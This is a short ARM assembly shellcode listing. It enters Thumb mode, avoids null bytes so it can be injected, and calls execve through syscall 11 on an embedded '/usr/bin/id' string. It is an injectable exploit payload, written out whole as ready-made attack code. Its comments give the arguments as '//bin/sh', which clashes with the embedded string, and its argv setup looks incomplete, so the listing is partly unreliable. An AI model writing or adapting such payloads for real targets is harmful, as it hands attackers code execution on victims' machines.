.section .text
.global _start

_start:

@ enter thumbmode
.code 32
add r6, pc, #1
bx r6

@ execve(const char *filename, char *const argv[],char *const envp[]);
@ arg1 = r0: //bin/sh
@ arg2 = r1: //bin/sh
@ arg3 = r2: 0
.code 16
sub r2,r2,r2      @ r2=0 (avoid null bytes)
mov r0, pc
add r0, #8    		@ 2 * [instructions] before .ascii string (2*4=8)
str r0, [sp, #4]
add r1, sp, #4
mov r7, #11      	@ execve
svc 1             @ syscall

.ascii "/usr/bin/id"
